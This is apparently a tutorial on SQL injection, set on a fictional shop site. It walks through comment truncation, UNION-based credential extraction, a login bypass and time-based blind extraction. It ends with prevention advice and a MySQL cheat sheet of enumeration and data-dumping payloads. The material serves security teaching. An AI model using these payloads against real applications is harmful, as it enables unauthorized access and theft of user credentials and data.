

 <h1 align="center">Support Document: Introduction to SQL Injection </h1>

​																												           Author: NGUYEN Vinh Thanh



#### **𝗦𝗤𝗟** **𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻** **was first discovered by Hacker Jeff Forristal in issue 54 of Hacker Zine Phrack magazine on Christmas Eve 1998 ([http://phrack.org/issues/54/8.html](http://phrack.org/issues/54/8.html?fbclid=IwAR2symki0g-L3YAWxzvjQJmDtCgBP07tKWLaAEszT45mMl28zgQkHhkvyiw)). 25 years later, SQLi is still in the top 10 most common security flaws in the world.**



### <u>**Brief**</u>

​	SQL (Structured Query Language) Injection, mostly referred to as SQLi is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.



### <u>**What is SQL Injection**</u>

​	Consider a dynamic website (programmed in PHP in this example) that has a system that allows users to search for products available from database. When the user clicks on the Gifts category, their browser requests the URL:

```html
https://jedha-boutique.com/products?category=Gifts
```

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

```
https://jedha-boutique.com/products?category=Gifts’;--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts';-- ' AND released = 1;
```

The double dash -- effectively removes the remainder of the query, so it no longer includes *AND released = 1*. This means that all products are displayed, including unreleased products.

​	

### <u>**Union-Based SQL Injection**</u>

​	Let's move on to a more advanced SQLi technique using SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability from other database tables.

Continue with the site *jedha-boutique.com* , but this time we try with the UNION operator:

```
https://jedha-boutique.com/products?category='+UNION+SELECT+username,+password+FROM+users;--
```

The SQL query then becomes:

```sql
SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users;-- ' AND released = 1;
```

This will cause the application to return all usernames and passwords along with the names and descriptions of products.



### <u>**Blind SQL Injection - Login Bypass**</u>

​	Unlike SQL injection Vulnerability that we have discussed above, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. This is where a trick with time will help us exploit this flaw.



​	Let's say our site allows login with credentials through a login form. In basic terms, the web application is asking the database "do you have a user with the username **alice** and the password **alice123**?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 

Here is the SQL query:

```sql
SELECT username,password FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
```

The **%username%** and **%password%** values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.

If a hacker tries to login with username **whatever** and password *' OR 1=1;--*, the query now changes to:

```sql
SELECT username,password FROM users WHERE username='whatever' AND password='' OR 1=1;-- ' LIMIT 1;
```

Since we add an OR operator with statement 1=1, which is always true, the query will always return as true, and access should be allowed on the website.

We can also disable the password checking part in the query with the payload like this:

```sql
SELECT username,password FROM users WHERE username='admin';-- ' and password='whatever' LIMIT 1;
```

This payload allows us to login as **admin** without a proper password.



### <u>**Blind SQL Injection - Time-based attack**</u>

​	This time, instead of trying to login, we want to enumerate a whole database structure and contents. However, unlike normal SQL injection with the search function where the result can clearly be seen, we only have access to the login form.

​	Let's exploit the SQLi vulnerability with the same example of Login Bypass above. Assuming that in the  table **users** exists a column named **telephone_number** We can use the payload like this:

> username: ' UNION SELECT SLEEP(5),telephone_number FROM users WHERE username='admin' and telephone_number LIKE '0%';--
>
> password: whatever

The query now is : 

```sql
SELECT username,password FROM users WHERE username='admin' UNION SELECT SLEEP(5),telephone_number FROM users WHERE username='admin' AND telephone_number LIKE '0%';-- ' AND password='whatever' LIMIT 1;
```

If there is a delay of approximately 5 seconds in the login page, it is confirmed that the user **admin** has a telephone number starting with a number **0**. Else, we keep trying with another number.

As we cycle through every possible digits, eventually the telephone number of the user **admin** is revealed.

To enumerate the whole database, it is possible to write a script ourselves, or use the tools like **sqlmap** or **burp suite** to automate the task



### <u>**SQL Injection - How to prevent**</u>

- **Prepared Statements (With Parameterized Queries):** In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards.  When a prepared statement is created, the SQL code is parsed and compiled once, and the parameter placeholders are replaced with question marks. When a user provides input, it is treated as a parameter and is bound to a placeholder. This means that the input is never interpreted as part of the SQL code, which prevents the attacker from injecting malicious code into the query.

- **Sanitize user input:** Validate and sanitize user input by removing any special characters or unexpected input that could be used for malicious purposes.

  

### <u>**SQLi Cheat sheet for MySQL**</u>

* Database enumeration: 

  ```mysql
  SELECT @@version #MySQL version
  
  0 UNION SELECT database() # Current database name
  ```

* Tables:

  ```mysql
  0 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'DATABASE_NAME'
  ```

* Column name:

  ```mysql
  0 UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = 'TABLE_NAME'
  ```

* Table Content:

  ```mysql
  0 UNION SELECT group_concat(username,':',password SEPARATOR '<br>') FROM TABLE_NAME
  ```

* Time delay:

  ```mysql
  SELECT SLEEP(10) # Sleep 10 seconds	
  ```

* Conditional time delay:

  ```mysql
  SELECT IF(YOUR-CONDITIONS-HERE ,SLEEP(10),'a')
  ```

* Comment

  ```mysql
  #Comment
  -- Comment   #Attention to the space after double dash
  /*comment*/  #This one is rarely used
  ```



### <u>**References**</u>

1. PortSwigger's Web Security Academy Blog "SQL Injection" 

   https://portswigger.net/web-security/sql-injection

2. Jeff Forristal - Hacker Zine Phrack magazine 

   http://phrack.org/issues/54/8.html

3. Tryhackme SQL Injection Room

   https://tryhackme.com/room/sqlinjectionlm

4. Tryhackme SQL Injection Lab

   https://tryhackme.com/room/sqlilab

   

   
